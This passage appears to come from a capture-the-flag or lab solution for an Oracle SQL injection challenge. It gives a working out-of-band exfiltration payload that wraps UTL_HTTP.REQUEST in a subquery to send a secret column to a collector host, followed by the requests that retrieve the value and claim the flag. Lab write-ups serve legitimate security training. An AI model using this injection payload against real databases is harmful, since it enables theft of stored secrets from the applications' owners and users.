`||` is the operator. Wrap the `UTL_HTTP.REQUEST` call in a scalar subquery
that reads `secrets.oracle_secret` in the same expression, and concatenate the
whole thing into the WHERE-clause string. Oracle will evaluate the subquery
(firing the HTTP request) as a side effect of building the string, even if the
final concatenated string matches no rows:

```
region = 'x' || (SELECT UTL_HTTP.REQUEST('http://oob:9000/x=' || oracle_secret)
                 FROM secrets WHERE ROWNUM = 1) || 'y'
```

Send that as the value of `region` (URL-encoded). The response is still
uninformative ("found 0 reports") — that's expected; the exfil rides the
side-effect channel, not the response.

Then:

```
GET /oob/received
```

is an app-side proxy to the in-lab collector. You will see one entry with a
path like `/x=<32 hex>`. That is `secrets.oracle_secret`. Submit it:

```
POST /solve   {"secret":"<32 hex>"}
```

and you get `FLAG{...}`. The DB is on a no-egress network, so the collector
is the only listener you can reach — but that is exactly enough.
